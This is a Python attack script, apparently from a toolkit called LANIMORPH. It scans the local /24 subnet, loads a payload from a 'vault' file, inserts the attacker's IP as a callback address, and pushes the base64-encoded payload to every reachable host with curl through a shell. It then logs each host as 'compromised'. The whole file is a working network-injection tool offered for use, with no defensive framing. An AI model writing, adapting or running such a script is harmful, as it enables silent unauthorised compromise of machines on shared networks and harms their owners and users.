#!/usr/bin/env python3
import os, socket, time, re
from datetime import datetime
from ipaddress import IPv4Network
from subprocess import run, DEVNULL

vault_path = os.path.expanduser("~/LANIMORPH/vault/vault_drop.txt")
log_path = os.path.expanduser("~/LANIMORPH/chain/inject_silent.log")

# === Get Local IP (safe fallback) ===
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("192.168.1.45", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

my_ip = get_local_ip()
subnet = ".".join(my_ip.split('.')[:-1]) + ".0/24"

# === Load Payload from Vault ===
if not os.path.exists(vault_path):
    print(f"[-] Vault not found: {vault_path}")
    exit(1)

with open(vault_path, "r") as vault:
    raw_payload = vault.read().strip()

if not raw_payload:
    print("[-] No current mutation loaded.")
    exit(1)

# Replace __CALLER__ with your local IP
payload = raw_payload.replace("__CALLER__", my_ip)

# === Subnet Scan + Injection ===
print(f"[+] Using vault drop: {vault_path}")
print(f"[+] Local IP: {my_ip}")
print(f"[+] Scanning subnet: {subnet}")

network = IPv4Network(subnet, strict=False)
timestamp = datetime.now().strftime("%b %d %H:%M")

def is_up(ip):
    try:
        run(["ping", "-c", "1", "-W", "1", ip], stdout=DEVNULL, stderr=DEVNULL)
        return True
    except:
        return False

def inject(ip):
    try:
        cmd = f"curl -s --max-time 2 --connect-timeout 2 {ip} -d \"$(echo '{payload}' | base64)\" > /dev/null"
        run(["sh", "-c", cmd], stdout=DEVNULL, stderr=DEVNULL)
        return True
    except:
        return False

injected = []

for host in network.hosts():
    target_ip = str(host)
    if target_ip == my_ip:
        continue
    if is_up(target_ip):
        if inject(target_ip):
            print(f"[+] Injected {target_ip}")
            injected.append(target_ip)
            with open(log_path, "a") as log:
                log.write(f"[{timestamp}] silent: Host compromised by {my_ip} [ {target_ip} ]\n")
        else:
            print(f"[-] Injection failed: {target_ip}")

print(f"[✓] Injection complete. Total: {len(injected)} hosts.")
